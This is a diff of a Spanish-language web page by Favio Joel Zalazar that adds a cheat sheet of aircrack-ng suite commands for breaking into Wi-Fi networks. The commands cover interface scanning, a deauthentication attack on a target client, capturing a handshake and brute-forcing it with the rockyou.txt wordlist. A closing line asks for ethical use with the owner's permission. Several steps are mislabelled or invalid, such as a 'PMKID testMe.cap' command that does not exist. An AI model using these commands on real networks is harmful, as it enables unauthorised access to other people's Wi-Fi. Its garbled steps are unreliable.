@@ -6,28 +6,43 @@
 		<link rel="stylesheet" href="../styles/style.css">
 		<link rel="stylesheet" href="../styles/popup.css">
 	</head>
-	<header class="fondoAzul dropSombraNegra padding2 superiorRadius">
-		<h1 class="letraBlanca textoLato tamanioGran margen2">Aircrack</h1>
-		<nav class="navDesplegable fondoNegro radius centrarItem letraBlanca letraAzulHover dropSombraNegra margen2">
+	<header class="fondoAzul dropSombraNegra padding2">
+		<h1 class="letraBlanca textoLato tamanioGran margen2">Aircrack-ng</h1>
+		<nav class="navDesplegable radius centrarItem letraBlanca letraAzulHover dropSombraNegra margen2">
 			<ul class="menu" id="navMenu"></ul>
 		</nav>
 	</header>
-	<body class="margen2">
+	<body>
 		<main class="padding2">
-			<h1 class="margen2 letraBlanca sombraNegra subrayado textoChanga tamanioGran">Aircrack commands</h1>
-			<div>
-				<h2 class="letraBlanca sombraNegra letraNaranja">Estamos trabajando, sepa disculpar</h2>
-			</div>
-	        <div class="padding2 encuadrar radius fondoVidrio centrarImagen">
-				<img class="radius" src="../images/mono1.jpeg" width="100%">
+			<h1 class="margen2 letraBlanca sombraNegra textoLato">Aircrack commands</h1>
+			<div class="margen2 centrarItem">
+				<br><h3 class="textoLato margen2 letraCeleste">aircrack-ng hacking de antenas WI-FI</h3>
+				<h4 class="letraCeleste margen2 textoLato">A tener en cuenta: Tab + C con A busco BSSID STATION con S cambia los valores de la tabla</h4><br>
+				<h4 class="letraEpica margen2 textoLato">Veo las interfaces de red</h4>
+				<h4 class="letraBlanca margen2 textoLato">airmon-ng</h4>
+				<h4 class="letraEpica margen2 textoLato">Escanear todas las redes Wi-Fi</h4>
+				<h4 class="letraBlanca textoLato margen2">sudo airodump-ng INTERFAZ</h4>
+			    <h4 class="letraEpica margen2 textoLato">Iniciamos el escaneo sobre la interfaz deseada</h4>
+				<h4 class="letraBlanca textoLato margen2">airmon-ng start INTERFAZ</h4>
+				<h4 class="letraEpica margen2 textoLato">Mirar CH y BBSSID que nos interesa</h4>
+				<h4 class="letraBlanca textoLato margen2">sudo airodump-ng</h4>
+				<h4 class="letraEpica margen2 textoLato">Encuentra los devices conectados a AA:AA:AA:AA:AA:AA</h4>
+				<h4 class="letraBlanca textoLato margen2">airodump-ng -c 1 --bssid AA:AA:AA:AA:AA:AA -w test2 INTERFAZ</h4>
+				<h4 class="letraEpica margen2 textoLato">Obtener el PMKID</h4>
+				<h4 class="letraBlanca textoLato margen2">aireplay-ng -0 9 -a AA:AA:AA:AA:AA:AA -c BB:BB:BB:BB:BB:BB INTERFAZ</h4>
+				<h4 class="letraEpica margen2 textoLato">Guardamos el PMKID en un archivo</h4>
+				<h4 class="letraBlanca textoLato margen2">PMKID testMe.cap</h4>
+				<h4 class="letraEpica margen2 textoLato">Aplicamos fuerza bruta al archivo guardado</h4>
+				<h4 class="letraBlanca textoLato margen2">aircrack-ng -b AA:AA:AA:AA:AA:AA -w rockyou.txt testMe.cap</h4>
+				<br><br><h4 class="letraRoja textoLato margen2">No es aplicable para cualquier tipo de red WI-FI, muchos dispositivos modernos dejan inutilizados escaneos de este tipo ¡USAR PARA FINES ÉTICOS Y BAJO EL PERMISO DEL DUEÑO DE LA RED!</h4>
 			</div>
 		</main>
 		<button class="margen2 fondoSubir" id="subir"></button>
 		<button class="margen2 fondoBajar" id="bajar"></button>
 	</body>
-	<footer class="fondoAzul letraBlanca dropSombraNegra inferiorRadius">
+	<footer class="fondoAzul letraBlanca dropSombraNegra">
 		<div class="redes horizontal">
-			<div class="copyright textoOsvaldo textoLato">©Copyright 2023 Favio Joel Zalazar. Todos los derechos reservados.</div>
+			<div class="tamanioMin fino textoLato centrarItem padding2">©Copyright 2023 Favio Joel Zalazar. Todos los derechos reservados.</div>
 			<div class="contenedorPopup">
 				<div class="botonModal">
 					<label for="btnModal">
